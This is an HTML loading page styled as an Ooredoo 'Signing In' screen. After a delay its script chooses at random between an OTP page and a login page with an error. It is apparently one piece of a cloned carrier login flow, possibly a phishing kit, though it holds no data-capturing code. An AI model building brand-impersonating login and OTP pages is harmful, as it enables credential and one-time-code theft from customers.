<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Loading - Ooredoo</title>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
  :root {
    --red: #D0191F;
    --white: #FFFFFF;
    --text: #1A1A1A;
    --text-light: #808080;
    --line: #D0D0D0;
    --bg: #FAFAFA;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body { height: 100%; }
  body { 
    font-family: 'Cairo', Tahoma, Arial, sans-serif; 
    background: var(--bg); 
    color: var(--text);
    display: flex;
    flex-direction: column;
  }

  .container {
    flex: 1; max-width: 1200px; width: 100%; margin: 0 auto;
    padding: 60px 24px; padding-bottom: max(40px, env(safe-area-inset-bottom, 0px));
    display: flex; flex-direction: column; align-items: center; justify-content: center;
  }

  .loading-content { text-align: center; }

  .spinner {
    width: 80px;
    height: 80px;
    border: 6px solid var(--line);
    border-top-color: var(--red);
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin: 0 auto 32px;
  }

  @keyframes spin {
    to { transform: rotate(360deg); }
  }

  h2 {
    font-size: 1.5rem;
    color: var(--text);
    margin-bottom: 12px;
    font-weight: 700;
  }

  p {
    color: var(--text-light);
    font-size: 1rem;
    font-weight: 500;
  }

  @media (max-width: 480px) {
    .container { padding: 48px 20px; }
    h2 { font-size: 1.3rem; }
    .spinner { width: 60px; height: 60px; border-width: 5px; }
  }
</style>
</head>
<body>

<main class="container">
  <div class="loading-content">
    <div class="spinner"></div>
    <h2>Signing In</h2>
    <p>Please wait...</p>
  </div>
</main>

<script>
  // Mock result: if accepted -> OTP page, if rejected -> login page with error message
  setTimeout(() => {
    const isAccepted = Math.random() > 0.5;
    
    if (isAccepted) {
      sessionStorage.setItem('loginError', 'Application accepted. Please continue with OTP verification.');
      window.location.href = 'otp_ooredoo_en.html';
    } else {
      sessionStorage.setItem('loginError', 'Application rejected. Please sign in again and try again.');
      window.location.href = 'login_ooredoo_en.html';
    }
  }, 2500);
</script>

</body>
</html>
